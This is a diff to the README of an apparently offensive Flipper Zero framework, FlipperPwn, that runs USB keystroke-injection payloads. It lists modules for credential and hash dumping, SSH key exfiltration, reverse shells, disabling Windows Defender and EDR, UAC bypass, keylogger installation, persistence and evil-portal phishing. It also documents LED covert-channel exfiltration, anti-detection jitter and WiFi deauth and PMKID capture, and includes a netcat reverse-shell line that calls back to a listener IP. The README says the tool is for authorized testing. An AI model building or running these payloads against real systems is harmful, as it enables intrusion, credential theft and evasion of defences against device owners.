@@ -18,7 +18,7 @@
 
 ---
 
-FlipperPwn is a Metasploit-inspired payload framework that turns Flipper Zero into a USB HID attack platform. Load `.fpwn` modules from an SD card, auto-detect the target OS via LED heuristics, configure options, and execute keystroke injection payloads — all from the Flipper's menu. Optional ESP32 WiFi Dev Board integration adds network scanning, deauth, and evil portal capabilities.
+FlipperPwn is a Metasploit-inspired payload framework (v1.2) that turns Flipper Zero into a full USB HID attack platform. Load `.fpwn` modules from an SD card, auto-detect the target OS via LED heuristics, configure options, and execute keystroke injection payloads — all from the Flipper's menu. 23 built-in modules span recon, credential capture, exploitation, and post-exploitation. The scripting engine supports variables, loops, conditional blocks, data exfiltration via LED covert channel, WiFi+HID combined attacks, random payload generation, and per-character typing delays for evasion. Optional ESP32 WiFi Dev Board integration adds network scanning, targeted deauth, evil portal credential phishing, PMKID capture, and station enumeration.
 
 > **This tool is for authorized security testing only. See the [Legal Disclaimer](#legal-disclaimer).**
 
@@ -62,7 +62,7 @@ FlipperPwn is a Metasploit-inspired payload framework that turns Flipper Zero in
 6. Execute: the payload opens the appropriate terminal/dialog for the detected OS, types the commands, and establishes access.
 7. Progress is shown live on the Flipper screen. Press **Back** at any time to abort.
 
-Up to **64 modules** can be loaded from the SD card simultaneously. Modules are discovered at startup by scanning `/ext/flipperpwn/modules/` for `.fpwn` files.
+Up to **32 modules** can be loaded from the SD card simultaneously. Modules are discovered at startup by scanning `/ext/flipperpwn/modules/` for `.fpwn` files.
 
 ---
 
@@ -115,45 +115,50 @@ Mixed HID + WiFi modules are supported: a single `.fpwn` file can scan nearby ne
 
 ## Built-in Modules
 
-18 modules ship with FlipperPwn, organized into four categories.
+23 modules ship with FlipperPwn, organized into four categories.
 
 ### Recon
 
 | Module | Description |
 |---|---|
-| `sys_info` | Dump OS version, hostname, CPU architecture, and current user |
-| `wifi_enum` | List saved WiFi profiles and their SSIDs (Windows netsh / macOS security) |
-| `network_enum` | Print active network interfaces, IPs, and routing table |
-| `av_detect` | Query running processes and services to fingerprint AV/EDR products |
+| `System Info Recon` | Dump OS version, hostname, CPU architecture, and current user |
+| `Network Recon` | Print active network interfaces, IPs, and routing table |
+| `Full Recon Suite` | Combined system, network, and process enumeration in one pass |
+| `Stealth Recon` | Low-noise recon using living-off-the-land binaries to avoid EDR |
+| `WiFi Recon Full` | Extract saved WiFi profiles and plaintext PSKs from the OS |
+| `OS Fingerprint Script` | LED-heuristic OS probe with result typed into an open text field |
 
 ### Credentials
 
 | Module | Description |
 |---|---|
-| `wifi_harvest` | Extract plaintext WiFi PSKs from the OS credential store |
-| `browser_creds` | Dump browser-saved credentials from common profile paths |
-| `ssh_keys` | Locate and exfiltrate SSH private keys from `~/.ssh/` |
-| `fake_login` | Overlay a credential-phishing prompt mimicking an OS auth dialog |
-| `env_dump` | Print environment variables including tokens, keys, and proxy settings |
+| `WiFi Credential Dump` | Extract plaintext WiFi PSKs from the OS credential store |
+| `Hash Dump` | Invoke credential harvesting to capture NTLM / shadow hashes |
+| `Browser History Dump` | Read and type browser history from common profile paths |
+| `Clipboard Dump` | Read and exfiltrate the current clipboard contents |
+| `SSH Key Dump` | Locate and exfiltrate SSH private keys from `~/.ssh/` |
+| `Evil Portal Phish` | Start an ESP32 evil portal captive page and capture credentials |
 
 ### Exploit
 
 | Module | Description |
 |---|---|
-| `reverse_shell_tcp` | Establish a reverse TCP shell back to a netcat listener |
-| `reverse_shell_dns` | DNS-tunneled reverse shell for egress-filtered environments |
-| `download_exec` | Download and execute a remote binary via PowerShell / curl / wget |
-| `uac_bypass_fodhelper` | UAC bypass via the fodhelper.exe auto-elevation vector (Windows) |
-| `msfvenom_stager` | Type the fetch-and-execute chain for a Metasploit meterpreter stager |
+| `Attack Chain` | Full multi-stage attack: recon → privilege escalation → persistence |
+| `Reverse Shell` | Establish a reverse TCP shell back to a netcat listener |
+| `Disable Defenses` | Disable Windows Defender and common EDR services via PowerShell |
+| `WiFi Attack Chain` | Scan → deauth → capture PMKID → type results via HID |
+| `Rickroll Beacon` | Spam fake SSIDs and open browser to rickroll URL on target |
+| `UAC Bypass RunAs` | UAC bypass via RunAs auto-elevation vector (Windows) |
+| `Payload Dropper` | Download and execute a remote binary via PowerShell / curl / wget |
 
 ### Post-Exploit
 
 | Module | Description |
 |---|---|
-| `persist_schtask` | Install a scheduled task / cron job for persistence |
-| `persist_startup` | Drop a startup entry (registry / launchd / systemd user unit) |
-| `disable_defender` | Disable Windows Defender real-time protection via PowerShell |
-| `add_user` | Create a local administrator account with a configurable password |
+| `Lock Screen` | Immediately lock the target workstation |
+| `Persistence Install` | Drop a startup entry (registry / launchd / systemd user unit) |
+| `Keylogger Install` | Install a keystroke logger and configure exfiltration |
+| `Random Password Gen` | Generate and type a cryptographically random password |
 
 ---
 
@@ -221,7 +226,7 @@ OPTION LHOST 192.168.1.100 "Listener IP"
 STRING nc {{LHOST}} {{LPORT}} -e /bin/bash
 ```
 
-Up to **8 options** per module. Names are case-sensitive.
+Up to **4 options** per module. Names are case-sensitive.
 
 ### Platform Sections
 
@@ -269,6 +274,73 @@ Supported tags: `WIN`, `MAC`, `LINUX`
 
 `<key>` can be a single letter, a named key (`ENTER`, `TAB`, `F5`, `SPACE`, etc.), or an arrow key name.
 
+#### Extended Text Commands
+
+| Command | Effect |
+|---|---|
+| `STRINGLN <text>` | Type text then press Enter |
+| `STRING_DELAY <ms> <text>` | Type with per-character delay |
+
+#### Key Hold/Release
+
+| Command | Effect |
+|---|---|
+| `HOLD <key>` | Hold a key or modifier down |
+| `RELEASE <key>` | Release a specific held key |
+| `RELEASE` | Release all held keys |
+
+#### LED State Commands
+
+| Command | Effect |
+|---|---|
+| `LED` | Flash green LED |
+| `LED_COLOR <color>` | Flash LED in RED/GREEN/BLUE/YELLOW/CYAN/MAGENTA |
+| `WAIT_FOR_CAPS_ON` | Wait until CapsLock LED is on (30s timeout) |
+| `WAIT_FOR_CAPS_OFF` | Wait until CapsLock LED is off |
+| `WAIT_FOR_NUM_ON` | Wait until NumLock LED is on |
+| `WAIT_FOR_NUM_OFF` | Wait until NumLock LED is off |
+
+#### Timing and Flow Control
+
+| Command | Effect |
+|---|---|
+| `DELAY <ms>` | Pause for milliseconds |
+| `DEFAULTDELAY <ms>` | Set default delay between all commands |
+| `JITTER <min> <max>` | Random delay for anti-detection |
+| `WAIT_BUTTON` | Pause until user presses OK on Flipper |
+| `REPEAT <n>` | Repeat the previous command n times |
+| `REPEAT_BLOCK <n>` / `END_REPEAT` | Loop a block of commands n times |
+| `IF_CONNECTED` / `END_IF` | Conditional: skip block if no ESP32 |
+
+#### Variables
+
+| Command | Effect |
+|---|---|
+| `VAR $name = value` | Define a runtime variable |
+| `SET $name = value` | Set/update a runtime variable |
+| Reference with `$name` in STRING/STRINGLN |
+
+#### Random Generation
+
+| Command | Effect |
+|---|---|
+| `RANDOM_STRING <length>` | Type random alphanumeric chars (max 64) |
+| `RANDOM_INT <min> <max>` | Type a random integer |
+
+#### Special Commands
+
+| Command | Effect |
+|---|---|
+| `ALTCODE <code>` | Type via Windows ALT+numpad entry |
+| `SYSRQ <key>` | Linux Magic SysRq key combo |
+| `TYPE_FILE <filename>` | Type contents of SD card file as keystrokes |
+
+#### Data Exfiltration
+
+| Command | Effect |
+|---|---|
+| `EXFIL <command>` | Run command, exfil output via CapsLock/NumLock LED toggling |
+
 #### WiFi Commands (requires ESP32)
 
 | Command | Description |
@@ -276,6 +348,16 @@ Supported tags: `WIN`, `MAC`, `LINUX`
 | `WIFI_SCAN` | Trigger an AP scan on the ESP32 |
 | `WIFI_JOIN <ssid> <pass>` | Connect to a network |
 | `WIFI_DEAUTH <bssid>` | Send deauth frames to target AP |
+| `WIFI_DEAUTH_TARGET <SSID>` | Targeted deauth against specific AP |
+| `WIFI_BEACON` | Beacon spam (fake SSIDs) |
+| `WIFI_PORTAL <SSID>` | Start evil portal captive page |
+| `WIFI_SNIFF_PMKID` | Capture PMKID handshakes |
+| `WIFI_HANDSHAKE` | WPA handshake capture via deauth |
+| `WIFI_SCAN_STA` | Scan associated client stations |
+| `WIFI_PROBE <ms>` | Sniff probe requests |
+| `WIFI_STA_RESULT` | Type station scan results as keystrokes |
+| `WIFI_STOP` | Stop any active WiFi operation |
+| `SAVE_WIFI` | Save all WiFi results to SD card |
 | `PING_SCAN <subnet>` | ICMP sweep (e.g., `192.168.1.0/24`) |
 | `PORT_SCAN <host>` | TCP connect scan on common ports |
 | `WIFI_RESULT` | Type the last scan result as HID keystrokes |
